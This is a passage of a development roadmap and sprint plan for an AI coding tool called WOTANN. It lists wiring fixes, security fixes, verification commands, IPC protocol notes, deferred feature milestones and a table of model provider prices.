| S3-6 | **Build native Gemini adapter into default free tier** — set Gemini 3 Flash as default when no paid provider configured | 1h | S3-1 | `node dist/index.js providers` shows Gemini as default |

**Sprint 3 total: ~33 hours.**

---

## SPRINT 4 — REFACTOR + SHIP (Week 4)

| ID | Task | Effort | Depends | Verify |
|---|---|---|---|---|
| S4-1 | **Split runtime.ts** into 4 files (~800 each): `runtime-core.ts` (constructor, config), `runtime-query-pipeline.ts` (already exists, expand), `runtime-intelligence.ts` (already exists, expand), `runtime-lifecycle.ts` (close, dream, session management) | 6h | All Sprint 1-2 | `npm run typecheck && npm test` |
| S4-2 | **Split kairos-rpc.ts** into 5 files by domain: `rpc-core.ts` (session, config, status), `rpc-providers.ts` (providers, cost), `rpc-agents.ts` (agents, autonomous, arena), `rpc-memory.ts` (memory, learning), `rpc-tools.ts` (git, lsp, execute, files) | 6h | All Sprint 1-2 | `npm run typecheck && npm test` |
| S4-3 | **iOS @Observable migration** — replace 215 @ObservableObject usages across 34 files with @Observable macro (iOS 17+) | 4h | — | Xcode build succeeds |
| S4-4 | **iOS SPM resolve** — `cd ios && swift package resolve`, delete duplicate .xcodeproj files | 1h | S2-12 | `ls ios/.build/checkouts/` shows MLX etc. |
| S4-5 | **npm publish preparation** — add `.npmignore` excluding `.map` files, empty `skills/`, research docs. Verify `npm pack --dry-run` produces clean tarball. | 1h | All Sprint 1-3 | `npm pack --dry-run 2>&1 \| grep -c ".map"` = 0 |
| S4-6 | **GitHub Release workflow** — add `.github/workflows/release.yml` triggered on tags, builds Tauri DMG + npm publish | 3h | S4-5 | Push a tag, verify GH Release appears |
| S4-7 | **install.sh fixes** — add Ollama install step (or explicit message), fix Linux PATH for nvm-installed Node | 1h | — | `bash install.sh --local` on clean machine |

**Sprint 4 total: ~22 hours.**

---

## GRAND TOTAL

| Sprint | Hours | Items | What It Unlocks |
|--------|-------|-------|----------------|
| Sprint 0 | ~1.5h | 10 | Security + honesty fixes |
| Sprint 1 | ~25h | 15 | Tool serialization + desktop transport + autonomous mode + ECDH + daemon health |
| Sprint 2 | ~25h | 17 | Remaining wiring + security + dead code cleanup + README honesty |
| Sprint 3 | ~33h | 6 | Native Gemini + competitive parity features |
| Sprint 4 | ~22h | 7 | Code quality + distribution |
| **Total** | **~106h** | **55** | **Ship-ready v0.2.0** |

---

## HOW TO USE THIS PLAN

**For Claude Code autonomous execution:**
1. Start at Sprint 0, item S0-1
2. Execute each item in order within the sprint
3. Items with no `depends:` can be parallelized (use `Agent` tool with `run_in_background`)
4. After each item: run the verification command
5. If verification fails: fix before moving to next item
6. Commit after each group or logical batch
7. After Sprint 0 + Sprint 1: run `npm run typecheck && npm test` as full regression
8. After Sprint 2: run `npm run typecheck && npm test && cd desktop-app && npx tsc --noEmit`
9. After Sprint 4: tag v0.2.0, push, verify GitHub Release

**Strategic sections to reference during implementation:**
- §16: Native Gemini adapter design (for S3-1)
- §17: Editor redesign blueprint (for S2-1, S2-2)
- §12: Hermes patterns to port (for S3-2, S3-3)
- §11: OpenClaw patterns (for S3-5)
- §20: TurboQuant port plan (for S3-4)
- §69: Definitive truth table (for S2-7 README reconciliation)

---

---

## §72.1 CORRECTIONS TO §72 — Missing Items, Dependency Fixes, Verification Fixes

> Cross-check of ALL punch list items from §4 (19), §33 (15), §35.9 (7), §44 (8), §61 (13), §70 (11) = 73 total source items against §72's 55 items revealed **30 missing items** and **5 dependency errors**. This section patches §72.

---

### DEPENDENCY CORRECTIONS

| §72 Item | Current Depends | Corrected Depends | Reason |
|---|---|---|---|
| S3-1 (Gemini adapter) | S1-1 through S1-6 | **None** | Native Gemini is a new adapter file. Doesn't depend on fixing tool serialization in OTHER adapters. |
| S3-2 (hermes parsers) | S1-2 | **None** | Hermes parsers are model-specific format parsers, independent of the generic XML parser in capability-augmenter. |
| S1-10 (workflow.save) | None | **S1-7** | Save handler exists on daemon side but desktop UI calls it via `sendMessage` which needs the transport fix to test. |
| S1-11 (workflow.start) | S1-10 | **S1-7, S1-10** | Also needs transport fix to test from desktop. |
| S4-1 (split runtime.ts) | All Sprint 1-2 | **S1-1, S1-12, S2-5, S2-6** | Only depends on items that modify runtime.ts or kairos-rpc.ts. README fixes, iOS cleanup, etc. are independent. |
| S4-2 (split kairos-rpc.ts) | All Sprint 1-2 | **S1-10, S1-11, S1-12, S2-5, S2-6** | Only depends on items that modify kairos-rpc.ts. |

### VERIFICATION COMMAND CORRECTIONS

| §72 Item | Current Verify | Corrected Verify | Reason |
|---|---|---|---|
| S0-2 (SOUL.md regex) | `npm run typecheck` | `npm run typecheck && npm test -- identity` | Typecheck only verifies types. Need test to verify regex matches. |
| S0-9 (skill frontmatter) | Node command | `npm test -- skills` | Can't run loader without building first. Use test suite. |
| S1-12 (autonomous.run) | `node dist/index.js autonomous "echo hello"` | **Test via daemon NDJSON-over-UDS** (NOT curl — daemon uses raw newline-delimited JSON, not HTTP): `node -e "const s=require('net').createConnection(require('os').homedir()+'/.wotann/kairos.sock',()=>{s.write(JSON.stringify({method:'autonomous.run',params:{task:'echo hello'}})+'\n');s.on('data',d=>console.log(d.toString()));setTimeout(()=>s.end(),10000)})"` | CLI path (index.ts:1950) creates a LOCAL executor that may still crash with ECANCELED. The RPC fix only fixes the daemon path. CLI path needs separate ECANCELED debug. |
| S2-14 (hooks to block) | `npm test -- hooks` | `npm test -- hooks` **after updating test expectations from "warn" to "block"** | Tests currently expect "warn" returns. Changing to "block" without updating tests will fail. |

### CRITICAL NOTE ON S1-12 (Autonomous Mode)

The fix in §72 S1-12 only addresses the **daemon RPC path** (`autonomous.run` handler in kairos-rpc.ts). The **CLI path** (`wotann autonomous` in index.ts:1950) has a separate issue — it creates a LOCAL `AutonomousExecutor` outside the runtime, and the `createRuntime()` call crashes with ECANCELED during ESM module loading. These are TWO DIFFERENT bugs:

1. RPC path: handler is a stub → **S1-12 fixes this**
2. CLI path: ESM loading ECANCELED → **needs separate investigation** (add as S2-18)

---

### 30 MISSING ITEMS — Add to Sprint 2 and Beyond

#### Add to Sprint 0 (trivial, security):

| ID | Source | Task | File:line | Effort | Verify |
|---|---|---|---|---|---|
| S0-11 | §4 #12 | **Fix config.set world-readable file perms** | `kairos-rpc.ts:1899` | Add `{mode: 0o600}` to writeFileSync options | `stat -f "%OLp" ~/.wotann/wotann.yaml` shows 600 |

#### Add to Sprint 2 (wiring + fixes):

| ID | Source | Task | File:line | Effort | Verify |
|---|---|---|---|---|---|
| S2-18 | §4 #3 | **Debug CLI autonomous ECANCELED** | `src/index.ts:1950` — the `createRuntime()` call crashes during ESM module loading. Investigate why `node:fs:732` read is cancelled. | 3h | `node dist/index.js autonomous "echo hello" --provider ollama` completes |
| S2-19 | §4 #6 | **Fix `wotann ci` fake stub** | `src/index.ts:2958` — currently returns fake success. Wire to actually run the command in sandbox. | 1h | `node dist/index.js ci "npm test"` runs real command |
| S2-20 | §4 #11 | **Fix SSRF DNS rebinding** | `src/tools/web-fetch.ts:153-170` — add `dns.lookup()` before fetch to check resolved IP against private ranges | 2h | `npm test -- web-fetch` |
| S2-21 | §4 #13 | **Wire iOS TaskMonitor executeTask callback** | `src/desktop/companion-server.ts:606` — add callback that forwards task to daemon autonomous executor | 2h | iOS autonomous task no longer hangs |
| S2-22 | §4 #14 | **Fix iOS MobileVoiceHandler** | `src/mobile/ios-app.ts:310-351` — replace synthetic fake transcription with actual transcription await | 1h | Voice transcription returns real text |
| S2-23 | §4 #15 | **Fix conversation-manager/project-manager persistence** | `desktop-app/src/*` — either add `writeFileSync` persistence or remove docstring claims of persistence | 2h | `npm run typecheck` |
| S2-24 | §4 #16 | **Wire mode.set to runtime** | `src/daemon/kairos-rpc.ts:2214` — add `this.runtime.setMode(params.mode)` call | 30 min | `npm test -- mode` |
| S2-25 | §4 #18 | **Fix cost.arbitrage real pricing** | `src/daemon/kairos-rpc.ts:2170` — replace hardcoded prices with real pricing from cost-tracker's COST_TABLE | 1h | RPC returns different recommendations based on actual rates |
| S2-26 | §33 #11 | **Amend CLAUDE.md immutability claim** | `CLAUDE.md` — change "Immutable data patterns throughout" to "Immutable value types; encapsulated mutable services" | 5 min | grep CLAUDE.md for updated text |
| S2-27 | §33 #13 | **Delete computer-use.md skill** | `skills/computer-use.md` — describes fake DSL that doesn't match real API. Will teach agents wrong patterns. | 5 min | `test ! -f skills/computer-use.md` |
| S2-28 | §33 #14 | **Delete computer_use/input.rs legacy** | `desktop-app/src-tauri/src/computer_use/input.rs` (456 LOC) — dual of top-level input.rs via osascript+cliclick. Redundant. | 30 min | `cargo check` passes without it |
| S2-29 | §35.9 #11 | **Fix `wotann companion start`** | `src/index.ts` — Commander.js schema has too many arguments. Fix argument definition. | 15 min | `node dist/index.js companion start` doesn't error |
| S2-30 | §35.9 #17 | **Fix stale daemon state** | `src/daemon/start.ts` — validate `daemon.pid` with `kill(pid, 0)` before "already running" verdict. Atomic-rename status.json only when fully ready. | 1h | Kill daemon uncleanly, restart works without manual cleanup |

#### Add to Sprint 3 (competitive parity):

| ID | Source | Task | Effort | Verify |
|---|---|---|---|---|
| S3-7 | §61 #45 | **Vision emulation — real OCR pipeline** | Replace placeholder `"[Image provided]"` with Florence-2 ONNX or macOS Vision framework for actual image description | 4h | Image in prompt produces real description for non-vision models |

#### Add to Sprint 4 (polish):

| ID | Source | Task | Effort | Verify |
|---|---|---|---|---|
| S4-8 | §35.9 #12 | **Add QR code to `wotann link`** | `npm install qrcode-terminal`, render in CLI alongside PIN | 30 min | `node dist/index.js link` shows QR in terminal |
| S4-9 | §35.9 #15 | **Expand `wotann doctor`** | Add checks: daemon health, socket existence, DB integrity, Ollama reachability, port conflicts, API key validity | 2h | `node dist/index.js doctor` shows 8+ checks |
| S4-10 | §33 #15 | **Fix user.ts prompt module** | `src/prompt/modules/user.ts` — either wire `DEFAULT_USER_TOKEN_BUDGET` to `UserModel.assembleUserContext()` or delete unused constant | 30 min | `npm run typecheck` |

#### Deferred (Sprint 5 / backlog — LOW priority):

| ID | Source | Task | Effort |
|---|---|---|---|
| S5-1 | §61 #46 | Edge TTS integration into voice cascade | 30 min |
| S5-2 | §61 #48 | Sidecar binaries: download-on-first-run or remove | 2h |
| S5-3 | §61 #50 | Delete mcp-marketplace.ts or replace with GitHub search | 30 min |
| S5-4 | §61 #51 | Delete SubagentLimit + LSP dead middleware layers | 30 min |
| S5-5 | §61 #52 | Wire consumers for 5 advisory middleware flags OR demote to telemetry | 2h |
| S5-6 | §61 #53 | Rename offload-to-disk or implement real disk persistence | 1h |
| S5-7 | §61 #54 | Fix macOS STT misleading "system" detection | 2h |
| S5-8 | §70 #57 | Wire remaining 5 forgecode techniques | 2h |
| S5-9 | §70 #58 | Wire or delete 8 orchestration modules in lib.ts only | 1h |
| S5-10 | §70 #59 | Fix auto-commit.ts simulateCommit to use real git | 1h |
| S5-11 | §70 #65 | Wire Live Activities Activity.request() | 2h |
| S5-12 | §70 #66 | Wire 6 getter-only intelligence modules into query path | 3h |
| S5-13 | §35.9 #14 | Add daemon --verbose flag or remove from docs | 15 min |
| S5-14 | §4 #17 | Replace LLM-based memory.verify with programmatic check | 1h |

---

### UPDATED TOTALS

| Sprint | Original Items | Added Items | New Total | Hours |
|--------|---------------|-------------|-----------|-------|
| Sprint 0 | 10 | 1 (S0-11) | **11** | ~1.5h |
| Sprint 1 | 15 | 0 (dependency fixes only) | **15** | ~25h |
| Sprint 2 | 17 | 13 (S2-18 through S2-30) | **30** | ~40h |
| Sprint 3 | 6 | 1 (S3-7) | **7** | ~37h |
| Sprint 4 | 7 | 3 (S4-8 through S4-10) | **10** | ~25h |
| Sprint 5 (backlog) | 0 | 14 (S5-1 through S5-14) | **14** | ~18h |
| **TOTAL** | **55** | **32** | **87 + 14 backlog** | **~146h + 18h backlog** |

---

### CROSS-CHECK COMPLETE

Every item from §4 (0-19), §33 (1-15), §35.9 (11-17), §44 (20-27), §61 (43-55), §70 (56-66) is now accounted for in §72 + §72.1. Zero items dropped.

| Source Section | Total Items | In §72 | In §72.1 Sprint 0-4 | In §72.1 Backlog | Accounted |
|---|---|---|---|---|---|
| §4 (0-19) | 20 | 12 | 7 (S0-11, S2-18 thru S2-25) | 1 (S5-14) | **20/20** ✅ |
| §33 (1-15) | 15 | 10 | 4 (S2-26 thru S2-28, S4-10) | 0 | **15/15** ✅ (§33 #7 TerminalBench covered by S2-7 README) |
| §35.9 (11-17) | 7 | 2 | 3 (S2-29, S2-30, S4-8, S4-9) | 1 (S5-13) | **7/7** ✅ |
| §44 (20-27) | 8 | 8 | 0 | 0 | **8/8** ✅ |
| §61 (43-55) | 13 | 5 | 1 (S3-7) | 7 (S5-1 thru S5-7) | **13/13** ✅ |
| §70 (56-66) | 11 | 5 | 0 | 4 (S5-8 thru S5-12) + 1 in Sprint 4 | **11/11** ✅ |
| **TOTAL** | **74** | **42** | **18** | **14** | **74/74** ✅ |

---

---

## §72.2 PROTOCOL AND STRUCTURAL NOTES FOR IMPLEMENTATION

> Critical implementation details that affect multiple items. Read before starting any sprint.

### IPC Protocol — NDJSON over Unix Domain Socket

The KAIROS daemon IPC is **NOT HTTP**. It is raw **newline-delimited JSON (NDJSON)** over a Unix Domain Socket (`~/.wotann/kairos.sock`):

```
Client → Daemon:  {"method":"chat.send","params":{"prompt":"hello"},"metadata":{"X-WOTANN-Token":"<token>"}}\n
Daemon → Client:  {"id":1,"result":{"content":"Hi there"}}\n
```

**Implications for S1-7** (replace `send_message` Tauri stub): The Rust fix must:
1. Open a `UnixStream` to `~/.wotann/kairos.sock` (use `ipc_client.rs` as reference — it already does this)
2. Write the JSON-RPC payload + `\n` to the stream
3. Read NDJSON response lines until the response with matching `id` arrives
4. Handle streaming responses (`{"method":"stream","params":{...}}`) for features like chat — forward as Tauri events
5. Read the session token from `~/.wotann/session-token.json` and inject as `metadata.X-WOTANN-Token`

**Implications for S1-12 verification**: Cannot use `curl`. Use `socat` or the Node.js one-liner in §72.1.

### S0-6 (claude-agent-sdk to peerDeps) — Runtime Impact

Moving `@anthropic-ai/claude-agent-sdk` to `peerDependencies` means `npm install wotann` will NOT install it automatically. Code that imports it must be wrapped in try/catch or made conditional:
```typescript
let ClaudeAgent: any;
try { ClaudeAgent = await import("@anthropic-ai/claude-agent-sdk"); } catch { /* SDK not installed */ }
```
Check which files import from this SDK and make them graceful when it's absent. If too many files depend on it, consider keeping it in `optionalDependencies` instead.

### S2-9 (delete dead code) — Import Cleanup Checklist

When deleting dead files, also remove their imports from:
- `src/lib.ts` (barrel export — check each deleted file's entry)
- `src/core/runtime.ts` (instantiates several dead modules in constructor)
- `src/daemon/kairos.ts` (imports some dead modules)
- Run `npm run typecheck` after each deletion to catch broken imports

### Sprint 2 Pacing — 30 Items Is 2 Weeks, Not 1

Sprint 2 expanded from 17 to 30 items (40h) after §72.1 additions. This is realistically **2 weeks**, not 1. Either:
- Split into Sprint 2a (S2-1 through S2-17, 25h) and Sprint 2b (S2-18 through S2-30, 15h)
- Or accept 2-week duration for Sprint 2 and shift Sprints 3-4 accordingly

Adjusted realistic timeline:
```
Week 1:   Sprint 0 + Sprint 1 (~26.5h)
Week 2:   Sprint 2a — original 17 items (~25h)
Week 3:   Sprint 2b — 13 added items (~15h)
Week 4:   Sprint 3 (~37h)
Week 5:   Sprint 4 (~25h)
```

Total: **~5 weeks** to ship v0.2.0, not 4.

### S1-3 through S1-6 — Provider-Specific Tool Formats

Each provider has a different tool schema format. Reference implementations:

| Provider | Format | Reference |
|----------|--------|-----------|
| **Anthropic** | `{ name, description, input_schema: {...} }` | [Anthropic API docs](https://docs.anthropic.com/en/docs/build-with-claude/tool-use) |
| **OpenAI / Copilot** | `{ type: "function", function: { name, description, parameters: {...} } }` | [OpenAI API docs](https://platform.openai.com/docs/guides/function-calling) |
| **Codex** | `tools` array in Responses API format — same as OpenAI but via `input` items | Check `@anthropic-ai/claude-agent-sdk` source for Codex format |
| **Ollama** | Already implemented correctly in `ollama-adapter.ts:204-214` | Use as reference |

### Competitive Feature Items NOT in Sprint Plan

§11-§13 describe 55+ competitive patterns to port (OpenClaw, hermes, OpenCode, oh-my-pi). Only 5 are in Sprint 3 (S3-1 through S3-7). The remaining 50+ are **v0.3.0+ scope**, not v0.2.0. Don't add them to this plan — they require separate design review after v0.2.0 ships.

### Cost Optimization Items NOT in Sprint Plan

§19 describes 25 cost optimizations ($22.50 → $4.01). None are in Sprint 0-4. These are **v0.3.0 scope** — performance optimization after functional correctness is achieved.

### Test Updates Required

Several items change behavior that existing tests may assert on:
- **S2-14** (hooks warn→block): Update test expectations
- **S2-9** (delete dead code): Remove test files that test deleted modules
- **S1-12** (autonomous.run): Add new integration test for executor wiring
- **S1-3 through S1-6** (tool serialization): Add tests verifying `tools:` appears in adapter fetch bodies

Always run `npm test` after implementation, not just `npm run typecheck`.

---

### Git Branching Strategy (Rollback Plan)

Create a branch before each sprint to enable clean rollback if regressions are introduced:

```bash
# Before each sprint:
git checkout -b sprint-N-$(date +%Y%m%d)
# After sprint passes full regression:
git checkout main && git merge sprint-N-*
# If sprint introduces regressions:
git checkout main  # abandon sprint branch, investigate
```

**Sprint 1 is highest risk** (S1-7 transport fix touches Rust + IPC + streaming). Create the branch, implement, run full regression (`npm run typecheck && npm test && cd desktop-app && npx tsc --noEmit`), merge only on green.

### S0-5 Additional Verification

After renaming `turboquant.ts` → `ollama-kv-compression.ts`, also check test imports:
```bash
grep -r "turboquant" tests/  # should return 0 results after updating
grep -r "turboquant" src/    # should return 0 results after updating
```
If tests import the old name, update those imports too before running `npm test`.

### S1-7 Effort Revision

Original estimate: 3h. **Revised: 3-5h.** The Rust UDS client must handle:
- Synchronous request → response (simple: write JSON+newline, read response line)
- **Streaming responses** (complex: daemon sends multiple `{"method":"stream","params":{...}}` lines before the final response). Must forward these as Tauri events so React components can update incrementally.
- Auth token injection from `~/.wotann/session-token.json`
- Connection failure handling (daemon not running)

Reference `ipc_client.rs` which already handles all of this for the sidecar manager. The pattern exists — adapting it to the Tauri command is the work.

### S2-7 Source of Truth Clarification

When reconciling README claims, use **§69 (DEFINITIVE Product Truth Table)** — NOT §46 (which has outdated Round 6 numbers). Key differences:

| Claim | §46 (OUTDATED) | §69 (CORRECT) |
|---|---|---|
| Intelligence modules | "30+ intelligence modules" | **"21 intelligence modules that meaningfully affect model behavior"** |
| Orchestration patterns | "11 orchestration strategies" | **"10 genuine multi-step orchestration patterns"** |
| Middleware | "20+ middleware layers" | **"20 functional middleware layers (2 always-on, 16 conditional, 2 dead)"** |

### S2-14 and S2-15 Ordering

**Do S2-14 FIRST (hooks warn→block), then run tests and fix failures, THEN do S2-15 (implement hollow hooks).** Updated dependency:

- S2-14: No dependency. Change 5 hooks from `action: "warn"` to `action: "block"`. **Then update tests to expect "block" and run `npm test -- hooks`.**
- S2-15: **Depends on S2-14 being green.** Implement 3 hollow hooks (PreCompactWALFlush, SessionSummary, MemoryRecovery). Run `npm test -- hooks` again.

Do not combine these into one commit. Hook enforcement changes are high-risk because they change what the agent is allowed to do.

---

## §73. DEFERRED ITEMS — CATEGORIZED ROADMAP

> Everything not in Sprints 0-4. Organized by version milestone and priority within each.

### Sprint 5 — Code Hygiene (post v0.2.0, ~18h)

Grouped by type for efficient execution:

**Dead Code Deletion (4 items, ~2h):**

| ID | Task | Effort | Risk |
|---|---|---|---|
| S5-3 | Delete `mcp-marketplace.ts` (5 hardcoded entries + fake registry URL) | 30 min | None — `MCPRegistry` in `registry.ts` is the real implementation |
| S5-4 | Delete SubagentLimit + LSP dead middleware layers | 30 min | None — conditions structurally never met |
| S5-9 | Delete or wire 8 lib.ts-only orchestration modules (spec-to-ship, agent-messaging, ambient-code-radio, red-blue-testing, consensus-router, auto-commit, agent-protocol, agent-graph-gen) | 1h | Check no downstream lib.ts consumers first |
| S5-13 | Remove `--verbose` from daemon docs (or add the flag) | 15 min | None |

**Wiring Fixes (5 items, ~12h):**

| ID | Task | Effort | What It Unlocks |
|---|---|---|---|
| S5-1 | Integrate Edge TTS into voice cascade | 30 min | Free high-quality TTS on all platforms (no API key needed) |
| S5-5 | Wire consumers for Guardrail/Summarization/Autonomy/Frustration/Cache middleware flags | 2h | 5 middleware layers stop being purely advisory |
| S5-8 | Wire remaining 5 forgecode techniques into query path | 2h | 875 lines of forgecode come alive (currently only 200/1075 fire) |
| S5-11 | Wire Live Activities `Activity.request()` in TaskMonitorViewModel | 2h | Dynamic Island shows agent progress on iOS |
| S5-12 | Wire 6 getter-only intelligence modules into query path | 3h | verification-cascade, benchmark, video, rd-agent, auto-verify, parallel-search become active |

**Bug Fixes (4 items, ~5h):**

| ID | Task | Effort | Impact |
|---|---|---|---|
| S5-6 | Rename `offload-to-disk` → `offload-to-memory` or implement real disk persistence | 1h | Honesty — the name is misleading |
| S5-7 | Fix macOS STT "system" detection to not report available when it can't transcribe | 2h | Users won't select a non-functional STT backend |
| S5-10 | Fix `auto-commit.ts` `simulateCommit()` to run real `git commit` | 1h | Auto-commit actually commits |
| S5-14 | Replace LLM-based `memory.verify` with programmatic file/hash check | 1h | Verification doesn't consume tokens |

**Infrastructure (1 item, ~2h):**

| ID | Task | Effort | Impact |
|---|---|---|---|
| S5-2 | Sidecar binaries: implement download-on-first-run for Ollama/Whisper or delete placeholders | 2h | Clean bundle without misleading 89-byte/0-byte files |

---

### v0.3.0 "Unbreak the Moat" (~200h, Weeks 6-10)

> Focus: competitive parity + cost reduction. These items make WOTANN defensible.

**Priority 1: Open-Model Ecosystem (50h)** — §12 hermes patterns

| Task | Source | LOC | Why |
|---|---|---|---|
| Port remaining 25 hermes patterns not in Sprint 3 | §12 #7-30 | ~5,000 | Skills Guard, Tirith verification, fuzzy find-replace, MCP OAuth, Skills Hub, V4A parser, smart approval, context compaction, FailoverReason classifier |
| Port OpenClaw standing orders discipline | §11 #10 | ~100 | Permanent operating authority with approval gates |
| Port OpenClaw `/elevated` session directive | §11 #4 | ~200 | Session-scoped permission escalation |
| Port OpenClaw 8-file bootstrap injection per turn | §11 #2 | ~250 | Richer context on every query |

**Priority 2: Cost Reduction (40h)** — §19 top 10

| Task | Source | Savings | LOC |
|---|---|---|---|
| 1-hour cache TTL on stable prompt blocks | §19 #1 | $8-11/mo | ~30 |
| Stable-to-volatile prompt ordering linter | §19 #2 | $3-5/mo | ~50 |
| Demote Opus → Sonnet as default | §19 #3 | $3-5/mo | ~10 |
| Fix Haiku routing string mismatch | §19 #4 | $1-3/mo | ~5 |
| Discount-aware PRICING_TABLE | §19 #5 | $1-3/mo | ~20 |
| Structured Outputs strict JSON Schema | §19 #7 | $2-4/mo | ~50 |
| Semantic embedding cache | §19 #8 | $4-6/mo | ~150 |
| Tool-call result dedup within session | §19 #9 | $2-3/mo | ~50 |
| Batch API routing | §19 #10 | $3-6/mo | ~100 |
| OpenAI prefix caching stability | §19 #6 | $2-3/mo | ~30 |

**Priority 3: OAuth Subscription Reuse (30h)** — §12 #16-20

| Task | Source | What It Unlocks |
|---|---|---|
| Copilot OAuth device flow | §12 #17 | Use existing GitHub Copilot subscription |
| Codex OAuth via auth.openai.com | §12 #18 | Use existing ChatGPT Plus/Pro subscription |
| Anthropic sk-ant-oat + ~/.claude.json import | §12 #20 | Use existing Claude Code login |
| Qwen OAuth via chat.qwen.ai | §12 #19 | Use existing Qwen subscription |
| Credential pool 4 strategies + 1h TTL | §12 #16 | Rotate across multiple auth methods |

**Priority 4: Capability Augmenter (20h)** — §14

| Task | Source | What It Unlocks |
|---|---|---|
| XGrammar/llguidance constrained decoding for Ollama | §14 gap 1 | Zero-retry structured output from small models |
| Tool RAG — semantic filter to top-5 tools per turn | §14 gap 2 | 3B models can use tools without confusion |
| Parallel tool-call handling in augmenter | §14 gap 3 | Multiple tool calls per turn for emulated models |
| Florence-2 ONNX vision pipeline | §14 gap 4 | Real image descriptions for non-vision models |
| Streaming parser (regex → incremental state machine) | §14 gap 6 | Tool calls detected mid-stream |

**Priority 5: Native Gemini Capabilities (30h)** — §16

| Task | Source | What It Unlocks |
|---|---|---|
| Google Search grounding as universal capability | §16 #2 | Free web search for all users via Gemini |
| Sandboxed Python code execution via Gemini | §16 #3 | Free Python sandbox for all users |
| URL context auto-injection | §16 #4 | Free URL scraping (20 URLs, 34MB each) |
| Thinking_level parameter mapping | §16 #6 | Tunable reasoning depth |
| Gemini explicit CachedContent | §16 #14 | 90% read discount above 32K tokens |

**Priority 6: Additional Patterns (30h)** — §13, §29, §32

| Task | Source | What It Unlocks |
|---|---|---|
| 30+ pre-wired LSPs with auto-activation | §13 OpenCode #1 | Real code intelligence across languages |
| Mid-session provider switching with context preservation | §29 Crush | Switch models without losing context |
| Symbol-level LSP editing (find_symbol, rename_symbol) | §29 Serena | Precise code editing without line numbers |
| Snapshot system with Git-backed pre/post diff badges | §29 Kilo Code | Visual change tracking |
| Per-tool permission granularity Allow/Ask/Deny | §29 Kilo Code | Granular security |

---

### v0.4.0 "Ship the Product" (~340h, Weeks 11-18) — Race vs Claude Apps

> Focus: the features that make WOTANN a product people choose over Claude Apps.

**Priority 1: Builder Tab MVP (80h)** — §15, §18

The flagship feature. 4-pane layout: Projects/Versions/Assets | Chat+Files | Preview+Device Toggle | Target+Inspector+Deploy. Target chips change the build pipeline (static/web/mobile/full-stack). 20 UX patterns from Lovable/Bolt/v0/Replit including Visual Edits, Checkpoints, Chat Mode split, self-healing browser test loop.

**Priority 2: Editor Redesign (40h)** — §17

Consolidate 4 parallel diff implementations into one `useComposerStore` Zustand slice. New 3-pane layout. Keyboard spec (Cmd+K inline, Cmd+Y/N per-hunk). Format matrix (hash-anchored for small models, SEARCH/REPLACE for large). Plan mode (Cmd+2).

**Priority 3: UI/UX Synergy (30h)** — §18

5-tab navigation (Chat/Editor/Workshop/Builder/Exploit). Microinteractions (streaming fade-in, tool-call reveal, thinking pulse, diff-apply animation). Progressive disclosure. Cross-surface continuity (Desktop→iOS banner, offline queueing). Capability chips in input bar.

**Priority 4: TurboQuant Expansion (20h)** — §20

After vector store ships in Sprint 3: KV cache compression via llama-cpp-turboquant fork, semantic response cache, skill embedding compression, iOS memory retrieval via WASM.

**Priority 5: Remaining Competitive Patterns (40h)** — §11, §13, §29

OpenClaw peekaboo-equivalent Computer Use, dreaming 3-phase cron with 6-signal scoring, ACP bridge for Zed/Neovim, OpenCode npm-installable plugins, Claude-Code-compatible skill packaging.

**Priority 6: Full Gemini Integration (30h)** — §16

Antigravity brain/ directory pattern, browser sub-agent, manager surface, environment snapshots, audio changelogs, starter apps gallery, batch API, native video understanding.

**Priority 7: Advanced Infrastructure (100h)**

iOS @Observable migration (if not done in Sprint 4), TerminalBench scoring runner, SWE-bench harness, benchmark dashboard, Apple Intelligence Foundation Models integration, NSUserActivity Handoff, global hotkey AI invocation, non-interactive exec-server.

---

### Complete Roadmap Summary

| Milestone | Scope | Hours | Timeline |
|---|---|---|---|
| **v0.2.0** (Sprints 0-4) | Fix broken, wire disconnected, ship installable | 164h | Weeks 1-5 |
| **Sprint 5** (backlog) | Code hygiene, dead code deletion, minor wiring | 18h | Week 6 |
| **v0.3.0** (Priorities 1-6) | Competitive moat, cost reduction, OAuth, augmenter | 200h | Weeks 6-10 |
| **v0.4.0** (Priorities 1-7) | Builder MVP, editor redesign, UI polish, benchmarks | 340h | Weeks 11-18 |
| **Total** | Full product | **~722h** | **~18 weeks** |

Ship v0.2.0 before **June 2026** (5 weeks from now). Ship v0.4.0 before **September 2026** to beat Claude Apps GA.

---

---

## §74. MULTI-PROVIDER COST OPTIMIZATION & INTELLIGENT ROUTING (supersedes §19)

> §19 was Claude-heavy with aggressive downgrading. This section covers ALL 17 providers with a conservative routing strategy that NEVER degrades quality unless certain.

### Full Provider Pricing Table (April 2026, web-verified)

| Provider | Model | Input $/M | Output $/M | Cached $/M | Cache % | Speed tok/s | Best For |
|---|---|---|---|---|---|---|---|
| **Anthropic** | Opus 4.6 | $15.00 | $75.00 | $1.50 | 90% | ~80 | Complex reasoning, architecture |
| **Anthropic** | Sonnet 4.6 | $3.00 | $15.00 | $0.30 | 90% | ~120 | General purpose coding |
| **Anthropic** | Haiku 4.5 | $0.80 | $4.00 | $0.08 | 90% | ~200 | Simple tasks, high volume |
| **OpenAI** | GPT-5.4 | $2.50 | $10.00 | $0.25 | 90% | ~150 | General purpose |
| **OpenAI** | GPT-5 | $1.25 | $10.00 | $0.125 | 90% | ~150 | Cost-efficient frontier |
| **OpenAI** | GPT-4.1 | $2.00 | $8.00 | $0.50 | 75% | ~200 | Code, structured output |
| **Google** | Gemini 3.1 Pro | $2.00 | $12.00 | $0.20 | 90% | ~100 | Research (FREE grounding 1500/day) |
| **Google** | Gemini 2.5 Flash | $0.15 | $0.60 | $0.02 | 90% | ~300 | Cheap + fast |
| **Google** | Gemini 3.1 Flash-Lite | $0.25 | $1.50 | — | — | ~400 | Budget tasks |
| **DeepSeek** | V4 | $0.30 | $0.50 | $0.03 | 90% | ~200 | Cheapest general purpose |
| **DeepSeek** | R1 | $0.55 | $2.19 | $0.14 | 75% | ~100 | Cheapest reasoning model |
| **xAI** | Grok 4 | $3.00 | $15.00 | $0.75 | 75% | ~100 | Frontier alternative |
| **xAI** | Grok 4.1 Fast | $0.20 | $0.50 | $0.05 | 75% | ~300 | Fast + cheap |
| **Mistral** | Large 3 | $0.50 | $1.50 | — | — | ~150 | Multilingual, European |
| **Mistral** | Nemo | $0.02 | $0.04 | — | — | ~200 | Cheapest commercial API |
| **Mistral** | Codestral | $0.30 | $0.90 | — | — | ~200 | Code specialist |
| **Groq** | Llama 3.3 70B | $0.59 | $0.79 | $0.30 | 50% | ~394 | Fastest inference |
| **Groq** | Llama 8B | $0.05 | $0.08 | — | — | ~840 | Fastest + cheapest |
